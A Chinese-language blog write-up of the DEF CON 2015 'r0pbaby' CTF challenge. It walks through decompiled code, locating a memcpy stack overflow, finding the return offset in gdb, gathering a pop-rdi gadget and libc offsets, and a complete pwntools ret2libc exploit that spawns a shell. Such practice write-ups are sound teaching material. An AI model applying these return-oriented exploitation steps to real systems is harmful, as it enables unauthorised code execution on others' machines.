---
title: Defcon2015R0pbaby
date: 2018-03-17 19:34:44
tags: CTF
---

## 0x00 前言

练练手~

## 0x01 程序分析

```
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ./r0pbaby 

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 1
libc.so.6: 0x00007FFFF7FF79B0
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 2
Enter symbol: system
Symbol system: 0x00007FFFF7857640
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 2
ab
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
```

<!--more-->

程序大致了解，拉到IDA里查看：

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  signed int v3; // eax@4
  unsigned __int64 v4; // r14@15
  int v5; // er13@17
  size_t v6; // r12@17
  int v7; // eax@18
  void *handle; // [sp+8h][bp-448h]@1
  char nptr[1088]; // [sp+10h][bp-440h]@2
  __int64 savedregs; // [sp+450h][bp+0h]@22

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, (__sighandler_t)handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
while ( 1 )
{
  while ( 1 )
  {
while ( 1 )
{
  choice();
  if ( !sub_B9A((__int64)nptr, 1024LL) )
  {
puts("Bad choice.");
return 0LL;
  }
  v3 = strtol(nptr, 0LL, 10);
  if ( v3 != 2 )
break;
  __printf_chk(1LL, (__int64)"Enter symbol: ");
  if ( sub_B9A((__int64)nptr, 64LL) )
  {
dlsym(handle, nptr);
__printf_chk(1LL, (__int64)"Symbol %s: 0x%016llX\n");
  }
  else
  {
puts("Bad symbol.");
  }
}
if ( v3 > 2 )
  break;
if ( v3 != 1 )
  goto LABEL_24;
__printf_chk(1LL, (__int64)"libc.so.6: 0x%016llX\n");
  }
  if ( v3 != 3 )
break;
  __printf_chk(1LL, (__int64)"Enter bytes to send (max 1024): ");
  sub_B9A((__int64)nptr, 1024LL);
  v4 = (signed int)strtol(nptr, 0LL, 10);
  if ( v4 - 1 > 1023 )
  {
puts("Invalid amount.");
  }
  else
  {
if ( v4 )
{
  v5 = 0;
  v6 = 0LL;
  while ( 1 )
  {
v7 = _IO_getc(stdin);
if ( v7 == -1 )
  break;
nptr[v6] = v7;
v6 = ++v5;
if ( v4 <= v5 )
  goto LABEL_22;
  }
  v6 = v5 + 1;
}
else
{
  v6 = 0LL;
}
LABEL_22:
memcpy(&savedregs, nptr, v6);
  }
}
if ( v3 == 4 )
  break;
LABEL_24:
puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
```

可以看到有一处

```
memcpy(&savedregs, nptr, v6);
```

存在溢出漏洞，gdb开始调试

```
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ gdb ./r0pbaby 
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./r0pbaby...(no debugging symbols found)...done.
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$
```

 

先随机生成50个字符串，然后运行时输入
​    

```
gdb-peda$ r
Starting program: /home/mask/CTF/Defcon2015_R0pbaby/r0pbaby 

Welcome to an easy Return Oriented Programming challenge...
Menu:
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: 3
Enter bytes to send (max 1024): 50
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff78fc870 (<__write_nocancel+7>:	cmprax,0xfffffffffffff001)
RDX: 0x7ffff7bd19e0 --> 0x0 
RSI: 0x7ffff7bd0483 --> 0xbd19e0000000000a 
RDI: 0x1 
RBP: 0x4173414125414141 ('AAA%AAsA')
RSP: 0x7fffffffddd8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
RIP: 0x555555554eb3 (ret)
R8 : 0x7ffff7bd19e0 --> 0x0 
R9 : 0x555555554fbb --> 0x732064614200203a (': ')
R10: 0x7ffff7fde740 (0x00007ffff7fde740)
R11: 0x246 
R12: 0x555555554a60 (xorebp,ebp)
R13: 0x7fffffffdeb0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554eae:	popr14
   0x555555554eb0:	popr15
   0x555555554eb2:	poprbp
=> 0x555555554eb3:	ret
   0x555555554eb4:	nopWORD PTR cs:[rax+rax*1+0x0]
   0x555555554ebe:	xchg   ax,ax
   0x555555554ec0:	push   r15
   0x555555554ec2:	movr15d,edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddd8 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
0008| 0x7fffffffdde0 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA")
0016| 0x7fffffffdde8 ("(AADAA;AA)AAEAAaAA0AAFAAbA")
0024| 0x7fffffffddf0 ("A)AAEAAaAA0AAFAAbA")
0032| 0x7fffffffddf8 ("AA0AAFAAbA")
0040| 0x7fffffffde00 --> 0x4162 ('bA')
0048| 0x7fffffffde08 --> 0xab1996ba18949eb3 
0056| 0x7fffffffde10 --> 0x555555554a60 (xorebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000555555554eb3 in ?? ()
gdb-peda$ 
```

然后算一下偏移：

```
gdb-peda$ x/x $rsp

0x7fffffffddd8:	0x6e41412441414241
gdb-peda$ pattern offset 0x6e41412441414241
7944702841627689537 found at offset: 8
```

那么偏移为8

下面来找gadgets` pop|ret`

```
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"|grep rdi 

0x000000000001f7a6 : pop rdi ; pop rbp ; ret
0x0000000000022b1a : pop rdi ; ret
0x00000000001331ad : pop rdi ; ret 0xffee
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$
```

 

然后system的地址程序的第二个功能以及提供了，然后是找`"/bin/sh"`字符串

```
mask@mask-virtual-machine:~/libc-database$ ./find system 640
/lib/x86_64-linux-gnu/libc.so.6 (id local-abcda3d9548f3fbdea4bbd1f4d3cc44c3866457f)
mask@mask-virtual-machine:~/libc-database$ ./dump local-abcda3d9548f3fbdea4bbd1f4d3cc44c3866457f
offset___libc_start_main_ret = 0x21ec5
offset_system = 0x0000000000046640
offset_dup2 = 0x00000000000ebfe0
offset_read = 0x00000000000eb800
offset_write = 0x00000000000eb860
offset_str_bin_sh = 0x17ccdb
mask@mask-virtual-machine:~/libc-database$ 
```

接下来编写exp：
​    

```
from pwn import *

io = process("./r0pbaby")
system = 0x00007FFFF7857640
rdi_gadget_offset = 0x22b1a
bin_sh_offset = 0x17ccdb
system_offset = 0x46640
libc_base = system - system_offset
print "[+] libc base: [%x]" % libc_base
rdi_gadget_addr = libc_base + rdi_gadget_offset
print "[+] RDI gadget addr: [%x]" % rdi_gadget_addr
bin_sh_addr = libc_base + bin_sh_offset
print "[+] \"/bin/sh\" addr: [%x]" % bin_sh_addr
system_addr = 0x00007FFFF7857640
print "[+] system addr: [%x]" % system_addr
payload = "A"*8
payload += p64(rdi_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
io.recv(1024)
io.sendline("3")
io.recv(1024)
io.send("%d\n"%(len(payload)+1))
io.sendline(payload)
io.sendline("4")
io.interactive()
```

运行：
​    

```
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ vim exp.py 
mask@mask-virtual-machine:~/CTF/Defcon2015_R0pbaby$ python exp.py 
[+] Starting local process './r0pbaby': pid 12591
[+] libc base: [7ffff7811000]
[+] RDI gadget addr: [7ffff7833b1a]
[+] "/bin/sh" addr: [7ffff798dcdb]
[+] system addr: [7ffff7857640]
[*] Switching to interactive mode
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Exiting.
$ id
uid=1000(mask) gid=1000(mask) 组=1000(mask),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),999(docker)
$ whoami
mask
$  
```